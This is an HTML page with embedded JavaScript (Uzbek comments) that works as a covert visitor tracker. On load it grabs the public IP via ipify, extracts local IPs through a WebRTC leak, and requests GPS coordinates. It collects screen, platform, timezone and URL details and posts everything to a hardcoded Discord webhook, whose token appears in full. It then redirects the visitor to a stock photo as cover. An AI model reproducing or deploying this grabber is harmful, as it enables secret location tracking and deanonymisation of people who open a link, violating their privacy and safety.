<!DOCTYPE html>
<html>
<body>
<script>
// Juda oddiy va ishonchli tracker
function startTracking() {
    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
    
    // 1. IP ni olish
    fetch('https://api.ipify.org?format=json')
    .then(function(response) { return response.json(); })
    .then(function(ipData) {
        const publicIP = ipData.ip;
        
        // 2. Local IP ni olish
        let localIPs = "Aniqlanmoqda";
        try {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); });
            
            const ips = [];
            pc.onicecandidate = function(e) {
                if (e.candidate) {
                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (match) ips.push(match[1]);
                }
            };
            
            setTimeout(function() {
                localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                sendToDiscord(publicIP, localIPs);
            }, 2000);
            
        } catch (e) {
            localIPs = 'Xato';
            sendToDiscord(publicIP, localIPs);
        }
    })
    .catch(function(error) {
        sendToDiscord('IP olishda xato', 'Noma lum');
    });
}

function sendToDiscord(publicIP, localIPs) {
    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
    
    const now = new Date();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    const message = {
        content: "üé£ FIRIBGAR KIRDI!\n" +
                 "üåê Public IP: " + publicIP + "\n" +
                 "üè† Local IPs: " + localIPs + "\n" +
                 "üïê Vaqt: " + now.toLocaleString() + "\n" +
                 "üìç Vaqt Zonasi: " + timezone + "\n" +
                 "üì± Ekran: " + screen.width + "x" + screen.height + "\n" +
                 "üíª Platforma: " + navigator.platform + "\n" +
                 "üîó URL: " + window.location.href
    };
    
    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message)
    })
    .then(function() {
        console.log('Ma lumotlar yuborildi');
    })
    .catch(function(error) {
        console.log('Yuborish xatosi:', error);
    })
    .finally(function() {
        // Rasmga o'tish
        setTimeout(function() {
            window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
        }, 2000);
    });
}

// GPS ni alohida yuborish
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const gpsMsg = {
                content: "üìç GPS TOPILDI!\n" +
                         "Kenglik: " + position.coords.latitude + "\n" +
                         "Uzunlik: " + position.coords.longitude + "\n" +
                         "Aniqlik: " + position.coords.accuracy + "m"
            };
            
            fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(gpsMsg)
            });
        },
        function(error) {
            console.log('GPS rad etildi');
        }
    );
}

// Darrov ishga tushirish
startTracking();
</script>
</body>
</html>
